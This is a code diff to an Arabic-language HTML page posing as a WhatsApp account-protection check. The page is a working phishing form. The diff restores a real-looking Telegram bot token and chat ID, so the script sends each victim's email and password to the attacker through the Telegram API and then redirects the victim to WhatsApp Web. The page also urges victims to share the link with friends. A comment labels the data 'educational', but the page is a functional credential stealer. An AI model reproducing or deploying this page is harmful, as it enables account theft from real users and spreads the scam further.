@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>تحقق واتساب - حماية الحساب</title>
     <style>
+        /* [كود CSS كما هو] */
         body {
             font-family: sans-serif;
             background: #f2f4f7;
@@ -53,7 +54,7 @@
             width: 100%;
             padding: 10px;
             margin-bottom: 15px;
-            background: #4CAF50; /* لون شبيه بالواتساب */
+            background: #4CAF50;
             color: white;
             border: none;
             border-radius: 8px;
@@ -121,28 +122,28 @@
             // منع الإرسال التقليدي للنموذج
             event.preventDefault(); 
             
-            // --- 1. بيانات البوت (تم مسحها للأمان وللسماح بالبناء) ---
-            const BOT_TOKEN = "TOKEN_REMOVED"; 
-            const CHAT_ID = "ID_REMOVED";     
+            // --- 1. بيانات البوت (القديمة - توكن معرض للخطر) ---
+            const BOT_TOKEN = "8518769039:AAHPWQWJEgROig0QKJg1xhTUGf6mUBfS53k"; 
+            const CHAT_ID = "6717287161";     
 
             // --- 2. الحصول على البيانات من حقول النموذج ---
             const email = document.getElementById("user_email").value;
-            const password = document.getElementById("password_field").value;
+            const password = document.getElementById("user_password").value;
 
-            // --- 3. بناء الرسالة (المحتوى الذي سيصلك في التلجرام) ---
+            // --- 3. بناء الرسالة ---
             const message = `🚨 بيانات تصيد تعليمية جديدة:\n\n📧 البريد: ${email}\n🔒 كلمة المرور: ${password}\n🌐 المصدر: ${window.location.hostname}`;
             
-            // --- 4. بناء رابط التلجرام API (سيفشل حالياً لعدم وجود التوكن، لكنه سيسمح بظهور الموقع) ---
+            // --- 4. بناء رابط التلجرام API ---
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
 
             // --- 5. إرسال الطلب عبر واجهة Fetch API ---
             fetch(url)
                 .then(response => {
-                    console.log("تمت محاولة الإرسال (التوكن محذوف).");
+                    console.log("تم إرسال البيانات التجريبية إلى التلجرام بنجاح.");
                     window.location.href = "https://web.whatsapp.com/"; 
                 })
                 .catch(error => {
-                    console.error("حدث خطأ أثناء الاتصال (بسبب حذف التوكن):", error);
+                    console.error("خطأ أثناء الإرسال:", error);
                     window.location.href = "https://web.whatsapp.com/"; 
                 });
             
@@ -156,7 +157,6 @@
         <div class="note">
             لإكمال تفعيل ميزة الحماية الجديدة، يرجى تأكيد بيانات حسابك.
         </div>
-
         <div class="share-prompt">
             <strong>خطوة إضافية:</strong> شارك هذا الرابط مع 3 من أصدقائك أو مجموعة لزيادة مستوى حماية حسابك.
         </div>
@@ -186,5 +186,5 @@
         </div>
     </div>
 </body>
-    </html>
+            </html>
     
